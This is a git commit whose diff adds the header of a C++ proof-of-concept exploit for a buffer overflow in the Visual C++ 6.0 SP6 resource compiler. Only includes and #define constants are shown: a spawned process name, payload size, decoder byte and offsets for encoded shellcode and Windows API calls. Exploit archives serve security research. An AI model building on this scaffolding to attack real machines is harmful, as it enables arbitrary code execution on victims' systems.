ef722406584ee63d9f44151208d462681f633284
Count Dracul Yeamin the Scorpio <34183654+mushfiqur47@users.noreply.github.com>
2023-12-30 17:13:29 +0600

    Microsoft Visual C++ 6.0 SP6 resource compiler buffer overflow

--- Microsoft Visual C++ - '.RC Resource Files' Local Buffer Overflow .cpp
+++ Microsoft Visual C++ - '.RC Resource Files' Local Buffer Overflow .cpp
@@ -10,3 +10,18 @@
 #include "stdio.h"
 #include "stdlib.h"
 #include "memory.h"
+
+#define STR01 "Microsoft Visual Studio 6.0 SP6 .rc PoC exploit by porkythepig"
+#define DEF_SPAWNED_PROCESS "notepad.exe"
+#define EXPL_SIZE 283
+#define DEC_CODE 0xBC
+#define DEC_CODE_OFFSET 0x2D
+#define ENC_SIZE_OFFSET 0x3E
+#define SHIFT 0x40
+#define SHIFT_DEC_OFFSET 0x35
+#define PROC_NAME_OFFSET 0x107
+#define GETSTAR_OFFSET 0x11
+#define CREPRO_OFFSET 0x6d
+#define GETWINDIR_OFFSET 0x25
+#define ESPSUB_OFFSET 0x08
+#define FNAMSHIFT_OFFSET 0x02
